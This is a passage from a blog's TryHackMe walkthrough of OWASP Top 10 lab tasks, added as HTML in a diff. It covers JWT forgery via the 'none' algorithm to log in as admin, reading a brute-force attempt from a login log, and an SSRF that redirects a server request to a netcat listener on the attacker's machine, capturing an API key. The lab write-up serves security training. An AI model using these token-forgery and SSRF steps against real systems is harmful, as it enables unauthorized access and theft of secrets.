+<li>Payload: <code>eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE5ODk1NzI0fQ</code></li>
+<li>Signature: <code>KY3A8a6eVrLrqFt606eVjfMLYLGTRtZAwthimwQO5Lo</code></li>
+</ul>
+<p>Now we can use the encode/decode online tool to modify the contents of the header and remove signature.</p>
+<p>First decode the <code>Header</code> part of the token
+<img src="image-26.png#center" alt="alt text"></p>
+<br>
+<p>Modify the <code>alg</code> value to <code>none</code>
+<img src="image-27.png#center" alt="alt text"></p>
+<br>
+<p>Decode the <code>Payload</code> part of the token
+<img src="image-28.png#center" alt="alt text"></p>
+<br>
+<p>Modify the value of the username to <code>admin</code>
+<img src="image-29.png#center" alt="alt text"></p>
+<br>
+<p>Remove Signature and combine those modified parts</p>
+<ul>
+<li>
+<p>Header_modified: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0</code></p>
+</li>
+<li>
+<p>Payload_modified: <code>eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE5ODk1NzI0fQ</code></p>
+</li>
+<li>
+<p>Combined_token_modified: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE5ODk1NzI0fQ.</code></p>
+</li>
+</ul>
+<p><em>Notice that I still kept the dot at then end even though we removed the signature part of the token.</em>
+<br></p>
+<p>Replace the value of the cookie to our modified token and refresh the page
+<img src="image-30.png#center" alt="alt text"></p>
+<br>
+<h3 id="9-security-logging-and-monitoring-failures">9. Security Logging and Monitoring Failures</h3>
+<p>When web applications are set up, every action performed by the user should be logged. Logging is important because if an incident occurs, the attackers&rsquo; activites can be traced. Once their actions are traced, their risk and impact can be determined.</p>
+<p>The information stored in logs should include the following:</p>
+<ul>
+<li>HTTP status codes</li>
+<li>Time Stamps</li>
+<li>Usernames</li>
+<li>API endpoints/page locations</li>
+<li>IP addresses</li>
+</ul>
+<p>These logs have sensitive information so it&rsquo;s important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#fab387">200</span> OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#fab387">200</span> OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#fab387">200</span> OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#fab387">200</span> OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">200</span> OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#fab387">200</span> OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login</span></span></code></pre></div>
+<br>
+<p>What IP address is the attacker using?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>49.99.13.16</code></pre>
+<br>
+<p>What kind of attack is being carried out?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>brute force</code></pre>
+<br>
+<h3 id="10-server-side-request-forgery-ssrf">10. Server-Side Request Forgery (SSRF)</h3>
+<p>This type of vulnerability occurs when an attacker coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web applicatio nneeds to use third-party services.</p>
+<p>Navigate to <code>http://MACHINE_IP</code>, where you&rsquo;ll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website&rsquo;s restricted area!</p>
+<p>Explore the website. What is the only host allowed to access the admin area?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>localhost</code></pre>
+<br>
+<p>Check the &ldquo;Download Resume&rdquo; button. Where does the server parameter point to?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>secure-file-storage.com</code></pre>
+<p><img src="image-31.png#center" alt="alt text"></p>
+<br>
+<p>Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{Hello_Im_just_an_API_key}</code></pre>
+<p>replace <code>secure-file-storage.com</code> part with your own AttackBox IP address and run <code>nc -lvp 8087</code> command.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvp <span style="color:#fab387">8087</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">8087</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>10.10.245.216: inverse host lookup failed: Unknown host
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.245.216<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">34718</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Host: 10.6.67.243:8087
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Accept: */*
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>X-API-KEY: THM<span style="color:#89dceb;font-weight:bold">{</span>Hello_Im_just_an_API_key<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+<br>
+
+  </content>
+  
+  <p>
+    
+    <a href="/blog/tryhackme/">#TryHackMe</a>&nbsp;&nbsp;
+    
+  </p>
+
+    </main>
+    <footer>
+      
+
+  <span>
+    
+    Made with
+    <a href="https://github.com/maolonglong/hugo-simple/">Hugo ʕ•ᴥ•ʔ Simple</a>
+  </span>
+
+
+    </footer>
+
+    
+</body>
+</html>
